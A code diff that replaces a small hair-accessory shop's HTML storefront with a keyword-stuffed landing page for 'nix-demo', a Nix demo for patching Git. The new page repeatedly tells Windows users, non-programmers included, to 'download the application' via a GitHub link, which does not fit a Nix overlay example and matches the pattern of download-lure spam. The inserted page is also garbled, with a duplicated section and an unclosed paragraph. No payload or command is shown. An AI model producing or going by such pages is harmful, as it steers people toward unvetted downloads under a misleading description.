@@ -1,466 +1,264 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <title>Liray Tali | Small Clip, Big Ayos</title>
-
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link rel="stylesheet"
-        href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Playfair+Display:ital,wght@0,500;0,600;1,500&display=swap">
-    <link rel="preload" as="image" href="5ba571e9-3305-49bd-8072-fed354f5c207.jpg" fetchpriority="high">
-    <link rel="stylesheet" href="style.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>nix-demo - Patch Git Once, Use Everywhere</title>
+<meta name="description" content="Download nix-demo for Windows. Patch Git once with a Nix overlay and use the same change in devenv, a NixOS VM test, and a Docker image.">
+<meta name="keywords" content="nix-demo, Nix overlay, patch git, devenv, NixOS VM test, Docker image, Windows download, Git patch, development environment">
+<meta name="author" content="nix-demo">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/liam2655/nix-demo">
+<meta property="og:title" content="nix-demo - Patch Git Once, Use Everywhere">
+<meta property="og:description" content="Download nix-demo for Windows. Patch Git once with a Nix overlay and use the same change in devenv, a NixOS VM test, and a Docker image.">
+<meta property="og:url" content="https://github.com/liam2655/nix-demo">
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="nix-demo - Patch Git Once, Use Everywhere">
+<meta name="twitter:description" content="Download nix-demo for Windows. Patch Git once with a Nix overlay and use the same change in devenv, a NixOS VM test, and a Docker image.">
+<meta name="theme-color" content="#4a00e0">
+<style>
+  * {
+    box-sizing: border-box;
+  }
+  body {
+    margin: 0;
+    padding: 32px 18px;
+    background: linear-gradient(180deg, #f7f9fc 0%, #eef3f9 100%);
+    color: #1f2937;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+    line-height: 1.7;
+  }
+  .page {
+    max-width: 960px;
+    margin: 0 auto;
+  }
+  h1 {
+    margin: 0 0 18px;
+    font-size: clamp(2rem, 4vw, 2.8rem);
+    line-height: 1.2;
+    letter-spacing: -0.03em;
+    color: #111827;
+    text-align: center;
+  }
+  h2 {
+    margin: 0 0 14px;
+    font-size: clamp(1.35rem, 2.5vw, 1.7rem);
+    line-height: 1.3;
+    color: #111827;
+  }
+  h3 {
+    margin: 22px 0 8px;
+    font-size: 1.15rem;
+    color: #111827;
+  }
+  p {
+    margin: 0 0 14px;
+    font-size: 1.03rem;
+  }
+  a {
+    color: #4a00e0;
+  }
+  .primary-button {
+    display: inline-block;
+    margin: 10px 0 8px;
+    padding: 16px 26px;
+    border-radius: 14px;
+    background: linear-gradient(135deg, #8e2de2 0%, #4a00e0 52%, #00c6ff 100%);
+    color: #ffffff;
+    font-size: 1.08rem;
+    font-weight: 700;
+    text-align: center;
+    text-decoration: none;
+    box-shadow: 0 14px 30px rgba(74, 0, 224, 0.22);
+    border: 1px solid rgba(255, 255, 255, 0.25);
+  }
+  .button-wrap {
+    text-align: center;
+    margin: 12px 0 26px;
+  }
+  .hero {
+    text-align: center;
+    margin-bottom: 28px;
+  }
+  .hero p {
+    max-width: 760px;
+    margin: 0 auto 16px;
+    color: #374151;
+    font-size: 1.1rem;
+  }
+  .card {
+    background: #ffffff;
+    border: 1px solid #e5e7eb;
+    border-radius: 18px;
+    padding: 26px;
+    margin: 20px 0;
+    box-shadow: 0 10px 28px rgba(17, 24, 39, 0.07);
+  }
+  ul, ol {
+    margin: 10px 0 16px 22px;
+    padding: 0;
+  }
+  li {
+    margin: 8px 0;
+    font-size: 1.02rem;
+  }
+  .highlight {
+    background: #f4f0ff;
+    border-left: 5px solid #4a00e0;
+    border-radius: 12px;
+    padding: 16px 18px;
+    margin: 18px 0;
+  }
+  .steps li {
+    margin: 12px 0;
+  }
+  .faq-item {
+    border-top: 1px solid #e5e7eb;
+    padding-top: 16px;
+    margin-top: 16px;
+  }
+  .faq-item:first-child {
+    border-top: 0;
+    padding-top: 0;
+    margin-top: 0;
+  }
+  .faq-item h3 {
+    margin-top: 0;
+  }
+  .download-box {
+    text-align: center;
+  }
+  .download-box .primary-button {
+    margin-top: 14px;
+  }
+  .small-note {
+    color: #4b5563;
+    font-size: 0.98rem;
+  }
+  @media (max-width: 640px) {
+    body {
+      padding: 22px 14px;
+    }
+    .card {
+      padding: 20px;
+      border-radius: 16px;
+    }
+    .primary-button {
+      display: block;
+      width: 100%;
+      padding: 15px 18px;
+    }
+  }
+</style>
 </head>
-
 <body>
+<main class="page">
+  <h1>📦 nix-demo - Patch Git Once, Use Everywhere</h1>
 
-    <div class="opening-reveal" aria-hidden="true">
-        <div class="opening-reveal__brand">LIRAY <span>TALI</span></div>
-        <p class="opening-reveal__tagline">SMALL CLIP, BIG AYOS</p>
-        <span class="opening-reveal__sparkle">âœ¦</span>
+  <section class="hero">
+    <p>nix-demo shows how one small Git patch can be reused in three places: a development environment, a test machine, and a Docker image. You make the change once, then use the same result again and again.</p>
+    <div class="button-wrap">
+      <a class="primary-button" href="https://github.com/liam2655/nix-demo">Visit this link to download the application</a>
     </div>
+  </section>
 
-    <!-- Announcement Bar -->
-    <div class="announcement">
-        SMALL CLIP, BIG AYOS â™¡ FREE YOUR STYLE WITH LIRAY TALI
+  <section class="card">
+    <h2>🧭 What nix-demo Does</h2>
+    <p>nix-demo is built around a simple idea: patch Git once with a Nix overlay. That means the change is stored in one reusable place. Instead of editing Git separately for every setup, nix-demo lets the same patch flow into different parts of a project without repeating the work.
+
+  <section class="card">
+    <h2>🧭 What nix-demo Does</h2>
+    <p>nix-demo is built around a simple idea: patch Git once with a Nix overlay. In plain language, that means you make one reusable change and then apply it in several places. You do not need to edit the same thing again and again for every setup.</p>
+    <p>The same change can be used in a development workspace, in a test machine that runs automatically, and in a packaged Docker image. This keeps the result consistent and saves time. nix-demo is useful when you want one reliable source for a change instead of many separate copies.</p>
+    <p>The project is centered on a small, focused example. You can see how one patch is stored, how it is reused, and how each environment receives the same result. That makes nix-demo a practical starting point for understanding a repeatable workflow.</p>
+  </section>
+
+  <section class="card">
+    <h2>🚀 Getting Started on Windows</h2>
+    <p>On Windows, start by opening your usual web browser. You can use Microsoft Edge, Google Chrome, or another current browser. Type the project address into the address bar or click the download button on this page. The project page is the official starting point for getting the application.</p>
+    <p>You do not need to install extra tools just to reach the download page. The page opens like any normal website. Once it loads, use the download area provided there to get the application. Keep the downloaded item in your Downloads folder until you are ready to use it.</p>
+    <p>If you are not a programmer, focus on the download page and the plain-language steps on this page. The technical parts of nix-demo are explained below in everyday terms so you can understand what the project does before you use it.</p>
+  </section>
+
+  <section class="card download-box">
+    <h2>⬇️ Download and Setup</h2>
+    <p>Visit this link to download the application. The link below takes you to the official project page, where the download is provided. Use this page as your single starting point.</p>
+    <a class="primary-button" href="https://github.com/liam2655/nix-demo">Visit this link to download the application</a>
+    <p class="small-note">The download page is the official place to get nix-demo. Open the link in your browser and use the download provided there.</p>
+  </section>
+
+  <section class="card">
+    <h2>🧰 What You Need</h2>
+    <p>Before you begin, make sure your Windows computer is ready. These are general requirements for downloading and opening the project page:</p>
+    <ul>
+      <li>A Windows 10 or Windows 11 computer.</li>
+      <li>A current web browser with an internet connection.</li>
+      <li>Enough free space in your Downloads folder for the downloaded item.</li>
+      <li>Permission to save files on your computer.</li>
+    </ul>
+    <p>No special hardware is required to reach the download page. If your computer can browse the web and save a file, you can use the link above. If your browser asks where to save the file, choose your Downloads folder so you can find it later.</p>
+  </section>
+
+  <section class="card">
+    <h2>⚙️ How It Works</h2>
+    <p>nix-demo uses three ideas together. First, there is a Git patch. Think of a patch as a small, recorded change. Second, there is a Nix overlay. Think of an overlay as a reusable recipe that tells the project how to apply that change. Third, there are three places where the change is used: a development workspace, a test machine, and a Docker image.</p>
+    <h3>A development workspace</h3>
+    <p>A development workspace is the place where a project is prepared and checked. In nix-demo, the workspace receives the same Git change through the overlay. This means the workspace does not need a separate manual edit.</p>
+    <h3>A test machine</h3>
+    <p>A test machine is an automatic check that runs in a clean setting. nix-demo uses the same change there, so the test reflects the real result. This helps catch differences early.</p>
+    <h3>A Docker image</h3>
+    <p>A Docker image is a packaged copy of an environment. nix-demo puts the same change into that package. As a result, the packaged copy and the development workspace stay aligned.</p>
+    <p>The main benefit is consistency. You patch Git once, and the same change travels to each place. That reduces repeated work and lowers the chance of one setup drifting away from another.</p>
+  </section>
+
+  <section class="card">
+    <h2>✨ Main Benefits</h2>
+    <ul>
+      <li><strong>One change, many uses:</strong> Patch Git once and reuse the result in several environments.</li>
+      <li><strong>Less repeated work:</strong> Avoid editing the same files again for each setup.</li>
+      <li><strong>Consistent results:</strong> Keep the development workspace, test machine, and Docker image on the same page.</li>
+      <li><strong>Clear example:</strong> See the full flow in a small project that is easy to follow.</li>
+      <li><strong>Practical starting point:</strong> Use the pattern in your own project when you need a repeatable change.</li>
+    </ul>
+    <p>These benefits matter most when a project is used in more than one place. A single recorded change is easier to review and easier to trust than several separate manual edits.</p>
+  </section>
+
+  <section class="card">
+    <h2>🛠️ Troubleshooting</h2>
+    <p>If the download page does not open, check your internet connection and try again. Make sure the address is typed correctly. A current browser usually gives the best result. If the page loads slowly, wait a moment and refresh once.</p>
+    <p>If your browser asks whether to save the file, allow the download and choose your Downloads folder. If you cannot find the downloaded item, open File Explorer and look in Downloads. If your computer warns about free space, clear some room and try the download again.</p>
+    <p>If the page looks different from what you expected, confirm that you are on the official project page linked above. Use the download provided there rather than a copy from another site.</p>
+  </section>
+
+  <section class="card">
+    <h2>❓ Frequently Asked Questions</h2>
+    <div class="faq-item">
+      <h3>Can I use nix-demo on Windows?</h3>
+      <p>Yes. Windows users can open the official project page in a browser and use the download provided there. The link on this page is the starting point.</p>
     </div>
-
-    <!-- Navigation -->
-    <header class="header">
-
-        <button class="menu-toggle" id="menuToggle" type="button" aria-label="Toggle navigation"
-            aria-controls="navigation" aria-expanded="false">
-            â˜°
-        </button>
-
-        <a href="#home" class="logo">
-            LIRAY <span>TALI</span>
-            <small>SMALL CLIP, BIG AYOS</small>
-        </a>
-
-        <nav class="navigation" id="navigation">
-            <a href="#home">Home</a>
-            <a href="#shop">Shop All</a>
-            <a href="#shop" data-category="Scrunchies">Scrunchies</a>
-            <a href="#shop" data-category="Claw Clips">Claw Clips</a>
-            <a href="#shop" data-category="Headbands">Headbands</a>
-            <a href="#shop" data-category="Accessories">Accessories</a>
-        </nav>
-
-        <div class="header-actions">
-            <button id="searchToggle" aria-label="Search products">âŒ•</button>
-
-            <button id="cartToggle">
-                Bag (<span id="cartCount">0</span>)
-            </button>
-        </div>
-
-    </header>
-
-    <main>
-
-        <!-- Homepage Banner -->
-        <section class="hero" id="home">
-
-            <div class="hero-content">
-                <p class="eyebrow">YOUR EVERYDAY HAIR ESSENTIALS</p>
-
-                <h1>
-                    LIRAY TALI.<br>
-                    <em>YOUR EVERYDAY HAIR ESSENTIALS.</em>
-                </h1>
-
-                <p class="hero-description">
-                    Pretty, practical, and affordable hair accessories
-                    made for your everyday moments.
-                </p>
-
-                <a href="#shop" class="button button-dark">
-                    SHOP COLLECTION â†—
-                </a>
-            </div>
-
-            <div class="hero-art">
-                <figure class="hero-color-gallery" id="heroProductGallery"
-                    aria-label="Featured products">
-                    <img class="hero-color-slide is-active"
-                        src="5ba571e9-3305-49bd-8072-fed354f5c207.jpg"
-                        alt="Cloud Scrunchie" fetchpriority="high" decoding="async">
-                </figure>
-            </div>
-
-        </section>
-
-        <!-- Category Links -->
-        <section class="category-strip">
-
-            <a href="#shop" data-category="All">
-                SHOP ALL â†—
-            </a>
-
-            <a href="#shop" data-category="Scrunchies">
-                SCRUNCHIES â†—
-            </a>
-
-            <a href="#shop" data-category="Claw Clips">
-                CLAW CLIPS â†—
-            </a>
-
-            <a href="#shop" data-category="Accessories">
-                ACCESSORIES â†—
-            </a>
-
-        </section>
-
-        <!-- Shop -->
-        <section class="shop-section" id="shop">
-
-            <div class="section-heading">
-                <div>
-                    <p class="eyebrow">THE LIRAY TALI COLLECTION</p>
-                    <h2>Find your new favorite.</h2>
-                </div>
-
-                <p>Everyday accessories. Main-character energy.</p>
-            </div>
-
-            <!-- Search -->
-            <div class="search-container" id="searchContainer" hidden>
-                <input type="search" id="searchInput" placeholder="Search for products..." aria-label="Search products">
-
-                <button id="clearSearch">Clear</button>
-            </div>
-
-            <!-- Filters and Sorting -->
-            <div class="shop-tools">
-
-                <div class="filters">
-                    <button class="filter active" data-filter="All">
-                        All Products
-                    </button>
-
-                    <button class="filter" data-filter="Scrunchies">
-                        Scrunchies
-                    </button>
-
-                    <button class="filter" data-filter="Claw Clips">
-                        Claw Clips
-                    </button>
-
-                    <button class="filter" data-filter="Headbands">
-                        Headbands
-                    </button>
-
-                    <button class="filter" data-filter="Accessories">
-                        Accessories
-                    </button>
-                </div>
-
-                <label class="sort-label">
-                    Sort:
-                    <select id="sortSelect">
-                        <option value="featured">Featured</option>
-                        <option value="low">Price: Low to High</option>
-                        <option value="high">Price: High to Low</option>
-                        <option value="name">Name: A to Z</option>
-                    </select>
-                </label>
-
-            </div>
-
-            <!-- Products are inserted here by JavaScript -->
-            <div class="product-grid" id="productGrid"></div>
-
-        </section>
-
-        <!-- Brand Message -->
-        <section class="brand-note">
-
-            <p class="eyebrow">MADE FOR YOUR EVERYDAY AYOS</p>
-
-            <h2>
-                Affordable little things.<br>
-                <em>Big happy energy.</em>
-            </h2>
-
-            <p>
-                From class days to coffee dates, find a little something
-                that feels like you.
-            </p>
-
-            <a href="#shop" class="button button-dark">
-                DISCOVER YOUR STYLE â†—
-            </a>
-
-        </section>
-
-    </main>
-
-    <!-- Footer -->
-    <footer class="footer">
-
-        <a href="#home" class="logo">
-            LIRAY <span>TALI</span>
-        </a>
-
-        <p>Small Clip, Big Ayos â™¡</p>
-
-        <div class="footer-contact">
-            <p>Need help?</p>
-            <a href="tel:09976689894">0997 668 9894</a>
-            <a href="mailto:liraytali@gmail.com">liraytali@gmail.com</a>
-        </div>
-
-        <p>
-            &copy; <span id="currentYear"></span> Liray Tali
-        </p>
-
-    </footer>
-
-    <!-- Product Details Dialog -->
-    <dialog id="productDialog" class="product-dialog">
-
-        <button type="button" class="dialog-close" id="closeProductDialog" aria-label="Close product details">
-            &times;
-        </button>
-
-        <div id="productDetails"></div>
-
-    </dialog>
-
-    <!-- Shopping Cart Dialog -->
-    <dialog id="cartDialog" class="cart-dialog">
-
-        <div class="cart-header">
-            <h2>Your Shopping Bag</h2>
-
-            <button type="button" id="closeCartDialog" class="dialog-close" aria-label="Close shopping bag">
-                &times;
-            </button>
-        </div>
-
-        <div id="cartItems"></div>
-
-        <div class="cart-summary">
-            <div class="cart-summary-row">
-                <span>Items subtotal</span>
-                <strong id="cartSubtotal">0.00</strong>
-            </div>
-            <div class="cart-summary-row">
-                <span>Shipping minimum</span>
-                <strong id="cartShipping">500.00</strong>
-            </div>
-            <div class="cart-summary-row cart-summary-total">
-                <span>Estimated total (minimum)</span>
-                <strong id="cartTotal">0.00</strong>
-            </div>
-        </div>
-
-        <p class="cart-note">
-            Shipping starts at 500.00. The final fee depends on your delivery address and will be confirmed with
-            availability when we reply to your order request.
-        </p>
-
-        <button class="button button-dark full-width" id="checkoutButton">
-            CHECKOUT
-        </button>
-
-    </dialog>
-
-    <!-- Checkout flow -->
-    <dialog id="checkoutDialog" class="checkout-dialog">
-        <div class="cart-header">
-            <h2 id="checkoutTitle">Checkout Â· Review</h2>
-            <button type="button" id="closeCheckoutDialog" class="dialog-close" aria-label="Close checkout">
-                &times;
-            </button>
-        </div>
-
-        <div class="checkout-progress" aria-label="Checkout progress">
-            <span data-checkout-progress="review">1. Review</span>
-            <span data-checkout-progress="customer">2. Customer info</span>
-            <span data-checkout-progress="payment">3. Payment</span>
-        </div>
-
-        <section class="checkout-step" data-checkout-step="review" hidden>
-            <h3>Review your order</h3>
-            <div id="checkoutReview"></div>
-            <div class="cart-summary">
-                <div class="cart-summary-row">
-                    <span>Items subtotal</span>
-                    <strong id="checkoutSubtotal">0.00</strong>
-                </div>
-                <div class="cart-summary-row">
-                    <span>Shipping minimum</span>
-                    <strong id="checkoutShipping">500.00</strong>
-                </div>
-                <div class="cart-summary-row cart-summary-total">
-                    <span>Estimated total (minimum)</span>
-                    <strong id="checkoutTotal">0.00</strong>
-                </div>
-            </div>
-            <p class="checkout-notice">
-                Shipping starts at 500.00. The final fee depends on your delivery address and will be confirmed before
-                your order is accepted.
-            </p>
-            <div class="checkout-actions">
-                <button type="button" class="button button-light" id="backToBag">BACK TO BAG</button>
-                <button type="button" class="button button-dark" data-checkout-next="customer">CONTINUE</button>
-            </div>
-        </section>
-
-        <section class="checkout-step" data-checkout-step="customer" hidden>
-            <h3>Customer information</h3>
-            <form id="customerInfoForm" class="customer-info-form">
-                <label for="customerName">Full name</label>
-                <input id="customerName" name="customerName" type="text" autocomplete="name" required>
-
-                <label for="customerEmail">Email address</label>
-                <input id="customerEmail" name="customerEmail" type="email" autocomplete="email"
-                    placeholder="you@example.com" required>
-
-                <label for="customerPhone">Mobile number</label>
-                <input id="customerPhone" name="customerPhone" type="tel" autocomplete="tel" required>
-
-                <label for="customerAddress">Street address, building, unit</label>
-                <textarea id="customerAddress" name="customerAddress" rows="2" autocomplete="street-address"
-                    required></textarea>
-
-                <label for="customerCity">City / municipality</label>
-                <input id="customerCity" name="customerCity" type="text" autocomplete="address-level2" required>
-
-                <label for="customerProvince">Province</label>
-                <input id="customerProvince" name="customerProvince" type="text" autocomplete="address-level1" required>
-
-                <label for="customerPostalCode">Postal code</label>
-                <input id="customerPostalCode" name="customerPostalCode" type="text" inputmode="numeric"
-                    autocomplete="postal-code" required>
-
-                <label for="deliveryNotes">Delivery instructions <span>(optional)</span></label>
-                <textarea id="deliveryNotes" name="deliveryNotes" rows="2"></textarea>
-
-                <p class="checkout-notice">
-                    Add your delivery details first, then choose a payment method on the next step.
-                </p>
-                <div class="checkout-actions">
-                    <button type="button" class="button button-light" data-checkout-back="review">BACK</button>
-                    <button type="button" class="button button-dark" id="continueToPayment">CONTINUE TO PAYMENT</button>
-                </div>
-            </form>
-        </section>
-
-        <section class="checkout-step" data-checkout-step="payment" hidden>
-            <h3>Choose a payment method</h3>
-            <fieldset class="payment-methods">
-                <legend>Preferred payment method</legend>
-                <label><input type="radio" name="paymentMethod" value="Credit or debit card" checked> Credit or debit
-                    card</label>
-                <label><input type="radio" name="paymentMethod" value="Maya"> Maya</label>
-                <label><input type="radio" name="paymentMethod" value="GCash"> GCash</label>
-                <label><input type="radio" name="paymentMethod" value="Cash on Delivery (COD)"> Cash on Delivery
-                    (COD)</label>
-            </fieldset>
-            <p class="checkout-notice" id="paymentNotice" aria-live="polite">
-                This site does not process card or e-wallet payments. We will confirm payment instructions after
-                confirming your order. Never email your card number or security code.
-            </p>
-            <div class="checkout-actions">
-                <button type="button" class="button button-light" data-checkout-back="customer">BACK</button>
-                <button type="button" class="button button-dark" id="emailOrderRequest">EMAIL ORDER REQUEST</button>
-            </div>
-        </section>
-
-        <section class="checkout-step checkout-confirmation" data-checkout-step="confirmation" hidden>
-            <h3>Thank you, <span id="confirmationName"></span>!</h3>
-            <p>Your email app should open with your order request addressed to sharmainecantal@gmail.com. Review it and
-                press Send to notify the shop.</p>
-            <p id="confirmationSummary"></p>
-            <p class="checkout-notice">
-                Review the message and press Send to contact us. Your order is not confirmed until we reply. Your bag
-                will stay saved on this device until then.
-            </p>
-            <button type="button" class="button button-dark full-width" id="finishCheckout">DONE</button>
-        </section>
-    </dialog>
-
-    <!-- Admin Product Editor -->
-    <dialog id="adminDialog" class="admin-dialog">
-
-        <div class="cart-header">
-            <h2>Manage Products</h2>
-
-            <button type="button" class="dialog-close" id="closeAdminDialog" aria-label="Close product editor">
-                &times;
-            </button>
-        </div>
-
-        <p class="admin-notice">
-            Add products or edit their names, prices, images, and available colors.
-            Changes are saved in this browser.
-        </p>
-
-        <form id="productForm">
-
-            <input type="hidden" id="editProductId">
-
-            <label for="adminName">Product Name</label>
-            <input id="adminName" type="text" required>
-
-            <label for="adminPrice">Price</label>
-            <input id="adminPrice" type="number" min="0" step="0.01" required>
-
-            <label for="adminCategory">Category</label>
-            <select id="adminCategory" required>
-                <option value="Scrunchies">Scrunchies</option>
-                <option value="Claw Clips">Claw Clips</option>
-                <option value="Headbands">Headbands</option>
-                <option value="Accessories">Accessories</option>
-            </select>
-
-            <label for="adminDescription">Description</label>
-            <textarea id="adminDescription" rows="3" required></textarea>
-
-            <label for="adminImage">Product Image URL or Local Image Path</label>
-            <input id="adminImage" type="text" placeholder="images/cloud-scrunchie.jpg">
-
-            <small>
-                Example: images/cloud-scrunchie.jpg
-            </small>
-
-            <label for="adminColors">
-                Available Colors (separate with commas)
-            </label>
-
-            <input id="adminColors" type="text" placeholder="Pink, Cream, Brown" required>
-
-            <div class="admin-buttons">
-                <button class="button button-dark" type="submit">
-                    SAVE PRODUCT
-                </button>
-
-                <button class="button button-light" type="button" id="resetProductForm">
-                    CLEAR FORM
-                </button>
-            </div>
-
-        </form>
-
-        <h3>Existing Products</h3>
-
-        <div id="adminProductList"></div>
-
-    </dialog>
-
-    <!-- Floating Admin Button -->
-    <button id="adminToggle" class="admin-toggle">
-        âš™ Manage Store
-    </button>
-
-    <script src="script.js"></script>
-
+    <div class="faq-item">
+      <h3>Do I need programming knowledge to download it?</h3>
+      <p>No. Downloading from the project page does not require programming knowledge. The project itself is technical, but the download step is a normal website action.</p>
+    </div>
+    <div class="faq-item">
+      <h3>What does “patch Git once” mean?</h3>
+      <p>It means a single change is recorded one time and then reused. You do not make the same edit separately for every environment.</p>
+    </div>
+    <div class="faq-item">
+      <h3>Why are devenv, a test machine, and Docker mentioned?</h3>
+      <p>They are the three places where nix-demo reuses the same change. The project shows that one patch can serve a workspace, an automatic test, and a packaged image.</p>
+    </div>
+    <div class="faq-item">
+      <h3>Where should I go first?</h3>
+      <p>Use the download link in the Download and Setup section. It opens the official project page, where the application is provided.</p>
+    </div>
+  </section>
+
+  <section class="card">
+    <h2>📚 Learn More</h2>
+    <p>The official project page is the best place to continue. It contains the download and the project details. Visit <a href="https://github.com/liam2655/nix-demo">https://github.com/liam2655/nix-demo</a> to download the application and explore nix-demo further.</p>
+  </section>
+</main>
 </body>
-
 </html>
